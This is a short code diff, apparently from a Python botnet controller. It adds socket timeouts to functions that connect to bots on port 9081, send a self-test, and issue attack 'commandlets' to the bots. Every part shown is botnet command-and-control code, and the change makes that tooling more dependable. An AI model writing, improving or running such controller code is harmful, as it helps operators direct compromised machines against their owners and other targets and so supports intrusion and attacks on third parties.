@@ -12,7 +12,9 @@ def add_a_bot(botnet_exemplars_ipv4):
 def GetInfoOfTheBot(botnet_exemplars_ipv4):
     try:
         sock = socket.socket()
+        sock.settimeout(2)
         sock.connect((botnet_exemplars_ipv4, 9081))
+        sock.settimeout(None)
         sock.send("selftest".encode("utf-8"))
         version = sock.recv(16384).decode("utf-8")
         if platform.system() == "Windows":
@@ -35,7 +37,9 @@ def extract_botnet_hostlist():
 def attack_a_bot(botnet_exemplars_ipv4, commandlet):
     if (botnet_exemplars_ipv4 != "" and botnet_exemplars_ipv4 != " " and botnet_exemplars_ipv4 != None):
         sock = socket.socket()
+        sock.settimeout(2)
         sock.connect((botnet_exemplars_ipv4, 9081))
+        sock.settimeout(None)
         sock.send(commandlet.encode("utf-8"))
         if commandlet in doublearg_cmdlets:
             firstarg = input(cmds["require_option"])
